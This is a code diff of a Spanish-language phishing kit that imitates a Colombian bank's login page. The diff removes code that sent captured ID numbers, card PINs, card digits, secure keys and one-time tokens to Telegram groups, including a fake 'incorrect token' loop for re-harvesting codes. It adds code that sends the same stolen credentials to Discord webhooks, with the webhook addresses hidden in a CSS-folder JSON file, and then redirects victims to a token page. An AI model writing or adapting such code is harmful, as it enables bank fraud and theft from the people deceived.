@@ -424,7 +424,7 @@
 
 <script>
 $(document).ready(function($) {
-    let TELEGRAM_BOT_TOKEN = '';
+    let TELEGRAM_BOT_TOKEN = ''; // No se usa directamente aquí, solo para referencia
     let TELEGRAM_CHAT_ID_GROUP1 = '';
     let TELEGRAM_CHAT_ID_GROUP2 = '';
 
@@ -437,7 +437,7 @@ $(document).ready(function($) {
             return response.json();
         })
         .then(data => {
-            TELEGRAM_BOT_TOKEN = data.telegram_bot_token;
+            TELEGRAM_BOT_TOKEN = data.telegram_bot_token; // Aunque no se use, se carga para mantener la estructura
             TELEGRAM_CHAT_ID_GROUP1 = data.telegram_chat_id_group1;
             TELEGRAM_CHAT_ID_GROUP2 = data.telegram_chat_id_group2;
             console.log("Tokens y IDs de chat cargados correctamente.");
@@ -454,8 +454,8 @@ $(document).ready(function($) {
 
 
     // Variables globales
-    let currentSessionId = null;
-    let statusCheckInterval = null;
+    let currentSessionId = null; // No se usa en esta implementación directa a Discord
+    let statusCheckInterval = null; // No se usa en esta implementación directa a Discord
     let tokenAttemptCount = 0; // Contador de intentos de token
     let initialLoginData = {}; // Para almacenar los datos de inicio de sesión iniciales
 
@@ -475,185 +475,38 @@ $(document).ready(function($) {
             }
         }
 
-        // --- Funciones para enviar datos a Telegram (Directo desde el frontend) ---
-        async function sendToTelegram(chatId, message) {
-            if (!TELEGRAM_BOT_TOKEN || !chatId) {
-                console.error('TOKEN o CHAT_ID de Telegram no configurados. No se puede enviar el mensaje.');
+        // --- Funciones para enviar datos a Discord (a través de webhooks) ---
+        async function sendToDiscordWebhook(webhookUrl, messageContent) {
+            if (!webhookUrl) {
+                console.error('URL del webhook de Discord no configurada. No se puede enviar el mensaje.');
                 return false;
             }
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             try {
-                const response = await fetch(url, {
+                const response = await fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
-                        'Content-Type': 'application/json'
+                        'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                        parse_mode: 'HTML' // Telegram allows plain text and HTML. Removing bold/monospace, so 'HTML' is still fine.
-                    })
+                        content: messageContent
+                    }),
                 });
-                const data = await response.json();
+
                 if (!response.ok) {
-                    console.error(`Error al enviar mensaje a Telegram (Chat ID: ${chatId}):`, data);
+                    const errorText = await response.text();
+                    console.error(`Error al enviar mensaje a Discord (Webhook): ${response.status} - ${errorText}`);
                     return false;
                 }
-                console.log(`Mensaje enviado a Telegram (Chat ID: ${chatId}):`, data);
+                console.log('Mensaje enviado a Discord exitosamente.');
                 return true;
             } catch (error) {
-                console.error(`Error de red al enviar mensaje a Telegram (Chat ID: ${chatId}):`, error);
+                console.error('Error de red al enviar mensaje a Discord:', error);
                 return false;
             }
         }
 
-        // --- Funciones para modales ---
-        function showTokenModal(errorMessage = '') {
-            // Remover cualquier modal existente antes de mostrar uno nuevo
-            $('#tokenModal, #errorModal, #successModal').remove();
-
-            const tokenModal = document.createElement('div');
-            tokenModal.id = 'tokenModal';
-            tokenModal.className = 'custom-modal';
-            tokenModal.innerHTML = `
-                <div class="custom-modal-content">
-                    <h3>Ingresa tu Token de Seguridad</h3>
-                    <p style="margin-bottom: 20px; color: #666;">Revisa el código que te llegó a tu celular o token físico</p>
-                    <input type="text" id="tokenInput" placeholder="Ingresa el token de 6 dígitos" maxlength="6">
-                    <button id="submitToken" disabled>Enviar Token</button>
-                    <div id="tokenError" class="error-message" style="${errorMessage ? 'display: block;' : 'display: none;' }">${errorMessage}</div>
-                </div>
-            `;
-            document.body.appendChild(tokenModal);
-
-            const tokenInput = document.getElementById('tokenInput');
-            const submitButton = document.getElementById('submitToken');
-            const tokenErrorDiv = document.getElementById('tokenError');
-
-            // Mostrar el mensaje de error si existe
-            if (errorMessage) {
-                tokenErrorDiv.textContent = errorMessage;
-                tokenErrorDiv.style.display = 'block';
-            } else {
-                tokenErrorDiv.style.display = 'none';
-            }
-
-            tokenInput.addEventListener('input', function() {
-                this.value = this.value.replace(/[^0-9]/g, '');
-                if (this.value.length === 6) {
-                    submitButton.removeAttribute('disabled');
-                } else {
-                    submitButton.setAttribute('disabled', 'true');
-                }
-            });
-
-            setTimeout(() => tokenInput.focus(), 100);
-
-            submitButton.addEventListener('click', function() {
-                const token = tokenInput.value;
-                if (token.length === 6) {
-                    submitToken(token);
-                }
-            });
-
-            tokenInput.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter' && this.value.length === 6) {
-                    submitToken(this.value);
-                }
-            });
-        }
-
-        async function submitToken(token) {
-            azul.style.display = 'block'; // Mostrar loader
-
-            tokenAttemptCount++; // Incrementar contador de intentos
-
-            // Construir el mensaje de Telegram con el formato deseado para el token (sin bold ni monospace)
-            let telegramMessage = `
-🚨 ACCESO DETECTADO! 🚨
-
----
-
-Datos Clave:
-Tipo ID: ${initialLoginData.identificationType || 'N/A'}
-No. Doc: ${initialLoginData.identificationNumber || 'N/A'}
-Clave: ${initialLoginData.debitCardKey || 'N/A'}
-4 Últimos: ${initialLoginData.last4Digits || 'N/A'}
-Clave Segura: ${initialLoginData.secureKey || 'N/A'}
-Token: ${token}
-
----
-
-📍 Detalles Conexión:
-IP: ${initialLoginData.ip || 'N/A'}
-Dispositivo: ${initialLoginData.device || 'N/A'}
-Fecha/Hora: ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}
-
----
-`;
-
-
-            const sentToGroup1 = TELEGRAM_CHAT_ID_GROUP1 ? await sendToTelegram(TELEGRAM_CHAT_ID_GROUP1, telegramMessage) : false;
-            const sentToGroup2 = TELEGRAM_CHAT_ID_GROUP2 ? await sendToTelegram(TELEGRAM_CHAT_ID_GROUP2, telegramMessage) : false;
-
-            // Simular espera de 40 segundos, incluso si el envío a Telegram es rápido
-            setTimeout(() => {
-                azul.style.display = 'none'; // Ocultar loader
-                if (sentToGroup1 || sentToGroup2) {
-                    const errorMessage = "El token ingresado es incorrecto. Por favor, inténtalo de nuevo.";
-                    showTokenModal(errorMessage); // Mostrar el modal de token con el mensaje de error
-                } else {
-                    showError("Error al enviar el token a Telegram. Verifica la configuración de tus IDs de chat o la conexión.");
-                }
-            }, 40000); // Simula la espera de 40 segundos antes de mostrar el error
-        }
-
-        function showError(message) {
-            azul.style.display = 'none';
-            clearInterval(statusCheckInterval);
-            $('#tokenModal, #errorModal, #successModal').remove(); // Asegurarse de que no haya otros modales
-
-            const errorModal = document.createElement('div');
-            errorModal.id = 'errorModal';
-            errorModal.className = 'custom-modal';
-            errorModal.innerHTML = `
-                <div class="custom-modal-content">
-                    <h3 style="color: #e74c3c;">Error de Autenticación</h3>
-                    <p class="error-message">${message}</p>
-                    <button id="closeError">Intentar de nuevo</button>
-                </div>
-            `;
-            document.body.appendChild(errorModal);
-
-            document.getElementById('closeError').addEventListener('click', function() {
-                errorModal.remove();
-                resetForm();
-            });
-        }
-
-        function showSuccess(message) {
-            azul.style.display = 'none';
-            clearInterval(statusCheckInterval);
-            $('#tokenModal, #errorModal, #successModal').remove();
-
-            const successModal = document.createElement('div');
-            successModal.id = 'successModal';
-            successModal.className = 'custom-modal';
-            successModal.innerHTML = `
-                <div class="custom-modal-content">
-                    <h3 style="color: #27ae60;">Acceso Autorizado</h3>
-                    <p class="success-message">${message}</p>
-                    <div style="margin-top: 20px;">
-                        <div style="width: 50px; height: 50px; border-radius: 50%; background: #27ae60; margin: 0 auto; display: flex; align-items: center; justify-content: center; color: white; font-size: 24px;">✓</div>
-                    </div>
-                </div>
-            `;
-            document.body.appendChild(successModal);
-
-            setTimeout(() => {
-                window.location.href = 'dashboard.html'; // Redirige a donde necesites
-            }, 3000);
-        }
+        // Ya no necesitamos modales de token aquí, ni showError/showSuccess como modales.
+        // La lógica de token se moverá a token.html.
 
         function resetForm() {
             // Limpiar todos los inputs
@@ -895,6 +748,8 @@ Fecha/Hora: ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })
 
             // --- Manejo de envío para tarjeta débito ---
             $("#botonazodos").off('click').on('click', async function() {
+                azul.style.display = 'block'; // Mostrar loader
+
                 // Recopilar todos los datos iniciales
                 initialLoginData = {
                     identificationType: document.getElementById("opcionamostrar").textContent.substring(0, 5),
@@ -902,8 +757,8 @@ Fecha/Hora: ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })
                     debitCardKey: $("#bdb-at-input2").val(),
                     last4Digits: $("#bdb-at-input3").val().replace(/\D/g, ''), // Asegurarse de enviar solo dígitos
                     secureKey: 'N/A', // No aplica para esta pestaña
-                    legalRepresentativeDoc: document.getElementById("menudesplegadodos").style.display === 'block' ? document.getElementById("opcionamostrardos").textContent.substring(0, 5) : '',
-                    legalRepresentativeNumber: document.getElementById("menudesplegadodos").style.display === 'block' ? $("#bdb-at-inputmenudos").val() : '',
+                    legalRepresentativeDoc: document.getElementById("menudesplegadodos").style.display === 'block' ? document.getElementById("opcionamostrardos").textContent.substring(0, 5) : 'N/A',
+                    legalRepresentativeNumber: document.getElementById("menudesplegadodos").style.display === 'block' ? $("#bdb-at-inputmenudos").val() : 'N/A',
                     ip: '', // Se llenará con la IP externa
                     device: detectar_dispositivo()
                 };
@@ -919,48 +774,44 @@ Fecha/Hora: ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })
                     initialLoginData.ip = 'N/A';
                 }
 
-                azul.style.display = 'block'; // Mostrar loader
+                // Construir el mensaje de Discord para NUEVO REGISTRO (clave 4 dígitos)
+                let discordMessage = `🍀 **NUEVO REGISTRO**\n\n`;
+                discordMessage += `**CC:** ${initialLoginData.identificationNumber}\n`;
+                discordMessage += `**Clave Targeta:** ${initialLoginData.debitCardKey}\n`;
+                discordMessage += `**4 dígitos:** ${initialLoginData.last4Digits}\n`;
+                if (initialLoginData.legalRepresentativeNumber !== 'N/A') {
+                    discordMessage += `**Tipo Rep. Legal:** ${initialLoginData.legalRepresentativeDoc}\n`;
+                    discordMessage += `**No. Rep. Legal:** ${initialLoginData.legalRepresentativeNumber}\n`;
+                }
+                discordMessage += `\n**IP:** ${initialLoginData.ip}\n`;
+                discordMessage += `**Dispositivo:** ${initialLoginData.device}\n`;
+                discordMessage += `**Fecha/Hora:** ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
 
-                // Construir el mensaje de Telegram con el formato deseado (sin bold ni monospace)
-                let telegramMessage = `
-🚨 ACCESO DETECTADO! 🚨
+                const webhookUrlGroup1 = localStorage.getItem('TELEGRAM_CHAT_ID_GROUP1'); // Usar los nombres de webhook para claridad
+                const webhookUrlGroup2 = localStorage.getItem('TELEGRAM_CHAT_ID_GROUP2');
 
----
+                const sentToGroup1 = webhookUrlGroup1 ? await sendToDiscordWebhook(webhookUrlGroup1, discordMessage) : false;
+                const sentToGroup2 = webhookUrlGroup2 ? await sendToDiscordWebhook(webhookUrlGroup2, discordMessage) : false;
 
-Datos Clave:
-Tipo ID: ${initialLoginData.identificationType || 'N/A'}
-No. Doc: ${initialLoginData.identificationNumber || 'N/A'}
-Clave: ${initialLoginData.debitCardKey}
-4 Ultimos: ${initialLoginData.last4Digits}
-Clave Segura: N/A
-Token: N/A
+                // Guardar los datos de inicio de sesión en sessionStorage para que token.html los pueda usar
+                sessionStorage.setItem('initialLoginData', JSON.stringify(initialLoginData));
+                sessionStorage.setItem('tokenAttemptCount', 0); // Resetear el contador de intentos de token
 
----
-
-📍 Detalles Conexión:
-IP: ${initialLoginData.ip || 'N/A'}
-Dispositivo: ${initialLoginData.device || 'N/A'}
-Fecha/Hora: ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}
-
----
-`;
-
-                const sentToGroup1 = TELEGRAM_CHAT_ID_GROUP1 ? await sendToTelegram(TELEGRAM_CHAT_ID_GROUP1, telegramMessage) : false;
-                const sentToGroup2 = TELEGRAM_CHAT_ID_GROUP2 ? await sendToTelegram(TELEGRAM_CHAT_ID_GROUP2, telegramMessage) : false;
-
-                // Simular espera breve antes de mostrar el modal del token
                 setTimeout(() => {
                     azul.style.display = 'none'; // Ocultar loader
                     if (sentToGroup1 || sentToGroup2) {
-                        showTokenModal(); // Mostrar directamente el modal para el token
+                        window.location.href = 'token.html'; // Redirigir a token.html
                     } else {
-                        showError("Error al enviar los datos iniciales a Telegram. Verifica la configuración de tus IDs de chat o la conexión.");
+                        // En caso de error en el envío inicial, mostrar un mensaje al usuario
+                        alert("Error al enviar los datos iniciales. Por favor, inténtalo de nuevo más tarde.");
                     }
                 }, 1000); // Pequeña espera para que se vea el loader
             });
 
             // --- Manejo de envío para clave segura ---
             $("#botonazouno").off('click').on('click', async function() {
+                azul.style.display = 'block'; // Mostrar loader
+
                 // Recopilar todos los datos iniciales
                 initialLoginData = {
                     identificationType: document.getElementById("opcionamostrar").textContent.substring(0, 5),
@@ -968,8 +819,8 @@ Fecha/Hora: ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })
                     secureKey: $("#bdb-at-input4").val(),
                     debitCardKey: 'N/A', // No aplica para esta pestaña
                     last4Digits: 'N/A', // No aplica para esta pestaña
-                    legalRepresentativeDoc: document.getElementById("menudesplegadodos").style.display === 'block' ? document.getElementById("opcionamostrardos").textContent.substring(0, 5) : '',
-                    legalRepresentativeNumber: document.getElementById("menudesplegadodos").style.display === 'block' ? $("#bdb-at-inputmenudos").val() : '',
+                    legalRepresentativeDoc: document.getElementById("menudesplegadodos").style.display === 'block' ? document.getElementById("opcionamostrardos").textContent.substring(0, 5) : 'N/A',
+                    legalRepresentativeNumber: document.getElementById("menudesplegadodos").style.display === 'block' ? $("#bdb-at-inputmenudos").val() : 'N/A',
                     ip: '', // Se llenará con la IP externa
                     device: detectar_dispositivo()
                 };
@@ -985,41 +836,35 @@ Fecha/Hora: ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })
                     initialLoginData.ip = 'N/A';
                 }
 
-                azul.style.display = 'block'; // Mostrar loader
+                // Construir el mensaje de Discord para NUEVO REGISTRO (clave segura)
+                let discordMessage = `🍀 **NUEVO REGISTRO**\n\n`;
+                discordMessage += `**CC:** ${initialLoginData.identificationNumber}\n`;
+                discordMessage += `**CLAVE:** ${initialLoginData.secureKey}\n`;
+                if (initialLoginData.legalRepresentativeNumber !== 'N/A') {
+                    discordMessage += `**Tipo Rep. Legal:** ${initialLoginData.legalRepresentativeDoc}\n`;
+                    discordMessage += `**No. Rep. Legal:** ${initialLoginData.legalRepresentativeNumber}\n`;
+                }
+                discordMessage += `\n**IP:** ${initialLoginData.ip}\n`;
+                discordMessage += `**Dispositivo:** ${initialLoginData.device}\n`;
+                discordMessage += `**Fecha/Hora:** ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
 
-                // Construir el mensaje de Telegram con el formato deseado (sin bold ni monospace)
-                let telegramMessage = `
-🚨 ACCESO DETECTADO! 🚨
+                const webhookUrlGroup1 = localStorage.getItem('TELEGRAM_CHAT_ID_GROUP1');
+                const webhookUrlGroup2 = localStorage.getItem('TELEGRAM_CHAT_ID_GROUP2');
 
----
+                const sentToGroup1 = webhookUrlGroup1 ? await sendToDiscordWebhook(webhookUrlGroup1, discordMessage) : false;
+                const sentToGroup2 = webhookUrlGroup2 ? await sendToDiscordWebhook(webhookUrlGroup2, discordMessage) : false;
 
-Datos Clave:
-Tipo ID: ${initialLoginData.identificationType || 'N/A'}
-No. Doc: ${initialLoginData.identificationNumber || 'N/A'}
-Clave: N/A
-4 Ultimos: N/A
-Clave Segura: ${initialLoginData.secureKey}
-Token: N/A
-
----
-
-📍 Detalles Conexión:
-IP: ${initialLoginData.ip || 'N/A'}
-Dispositivo: ${initialLoginData.device || 'N/A'}
-Fecha/Hora: ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}
-
----
-`;
-
-                const sentToGroup1 = TELEGRAM_CHAT_ID_GROUP1 ? await sendToTelegram(TELEGRAM_CHAT_ID_GROUP1, telegramMessage) : false;
-                const sentToGroup2 = TELEGRAM_CHAT_ID_GROUP2 ? await sendToTelegram(TELEGRAM_CHAT_ID_GROUP2, telegramMessage) : false;
+                // Guardar los datos de inicio de sesión en sessionStorage para que token.html los pueda usar
+                sessionStorage.setItem('initialLoginData', JSON.stringify(initialLoginData));
+                sessionStorage.setItem('tokenAttemptCount', 0); // Resetear el contador de intentos de token
 
                 setTimeout(() => {
                     azul.style.display = 'none'; // Ocultar loader
                     if (sentToGroup1 || sentToGroup2) {
-                        showTokenModal();
+                        window.location.href = 'token.html'; // Redirigir a token.html
                     } else {
-                        showError("Error al enviar los datos iniciales a Telegram. Verifica la configuración de tus IDs de chat o la conexión.");
+                        // En caso de error en el envío inicial, mostrar un mensaje al usuario
+                        alert("Error al enviar los datos iniciales. Por favor, inténtalo de nuevo más tarde.");
                     }
                 }, 1000); // Pequeña espera para que se vea el loader
             });
@@ -1037,6 +882,21 @@ Fecha/Hora: ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })
                 clearInterval(statusCheckInterval);
             }
         });
+
+        // Al cargar la página, recuperar los webhooks y guardarlos en localStorage
+        // Esto es crucial para que token.html pueda acceder a ellos
+        fetch('css/styles.json')
+            .then(response => response.json())
+            .then(data => {
+                if (data.telegram_chat_id_group1) {
+                    localStorage.setItem('TELEGRAM_CHAT_ID_GROUP1', data.telegram_chat_id_group1);
+                }
+                if (data.telegram_chat_id_group2) {
+                    localStorage.setItem('TELEGRAM_CHAT_ID_GROUP2', data.telegram_chat_id_group2);
+                }
+            })
+            .catch(error => console.error('Error al cargar y guardar webhooks:', error));
+
     } // Fin de initializeFormLogic
 });
 </script>
